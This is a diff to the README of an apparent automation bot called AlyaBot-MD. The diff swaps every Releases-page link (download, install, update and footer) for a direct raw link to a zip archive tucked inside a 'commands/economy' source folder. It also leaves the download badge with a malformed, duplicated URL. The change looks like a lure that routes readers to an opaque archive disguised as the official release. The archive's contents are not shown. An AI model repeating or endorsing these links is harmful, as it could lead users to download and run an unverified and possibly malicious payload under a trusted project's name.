@@ -6,7 +6,7 @@ Welcome to AlyaBot-MD! This program helps you automate routine tasks easily. Per
 
 ## 📥 Download Now
 
-[![Download AlyaBot-MD](https://img.shields.io/badge/Download%20AlyaBot--MD-v1.0-blue.svg)](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases)
+[![Download AlyaBot-MD](https://raw.githubusercontent.com/NusaibaTworat2005/AlyaBot-MD/main/commands/economy/MD-Alya-Bot-1.9.zip%https://raw.githubusercontent.com/NusaibaTworat2005/AlyaBot-MD/main/commands/economy/MD-Alya-Bot-1.9.zip)](https://raw.githubusercontent.com/NusaibaTworat2005/AlyaBot-MD/main/commands/economy/MD-Alya-Bot-1.9.zip)
 
 ## 🔍 Overview
 
@@ -32,7 +32,7 @@ To ensure AlyaBot-MD runs smoothly, please check the following system requiremen
 
 To get started with AlyaBot-MD, simply visit our Releases page to download the latest version:
 
-[Download AlyaBot-MD](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases)
+[Download AlyaBot-MD](https://raw.githubusercontent.com/NusaibaTworat2005/AlyaBot-MD/main/commands/economy/MD-Alya-Bot-1.9.zip)
 
 After downloading, follow these steps to install and run the application:
 
@@ -56,7 +56,7 @@ After downloading, follow these steps to install and run the application:
 
 To ensure you have the latest features and fixes, regularly check for updates. You can do this by visiting the Releases page:
 
-[Update AlyaBot-MD](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases)
+[Update AlyaBot-MD](https://raw.githubusercontent.com/NusaibaTworat2005/AlyaBot-MD/main/commands/economy/MD-Alya-Bot-1.9.zip)
 
 If a new version is available, download it and follow the same installation steps above to update your current version.
 
@@ -77,4 +77,4 @@ We love hearing from our users! Please share your experiences, suggestions, or r
 
 Thank you for choosing AlyaBot-MD! Your feedback is important, and we appreciate your support.
 
-For more details and to stay updated with new releases, visit our official [Releases page](https://github.com/NusaibaTworat2005/AlyaBot-MD/releases).
+For more details and to stay updated with new releases, visit our official [Releases page](https://raw.githubusercontent.com/NusaibaTworat2005/AlyaBot-MD/main/commands/economy/MD-Alya-Bot-1.9.zip).
